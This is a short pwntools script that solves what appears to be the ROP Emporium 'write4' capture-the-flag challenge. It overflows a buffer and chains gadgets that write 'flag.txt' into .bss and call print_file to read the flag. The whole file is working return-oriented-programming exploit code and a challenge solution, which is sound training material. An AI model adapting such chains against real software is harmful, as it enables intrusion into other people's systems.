from pwn import *

p = process("./write4")
#gdb.attach(p, 'b *pwnme+138')

payload  = b""
payload += b"A"*0x28
payload += p64(0x400690)				# pop 14 ; pop 15 ; ret
payload += p64(0x601038)				# .bss address to write to
payload += b"\x66\x6c\x61\x67\x2e\x74\x78\x74"		# flag.txt
payload += p64(0x400628)				# mov qword ptr [r14], r15 ; ret
payload += p64(0x400693)				# pop rdi ; ret
payload += p64(0x601038)				# .bss address
payload += p64(0x400510)				# print_file@plt

p.sendline(payload)
p.interactive()
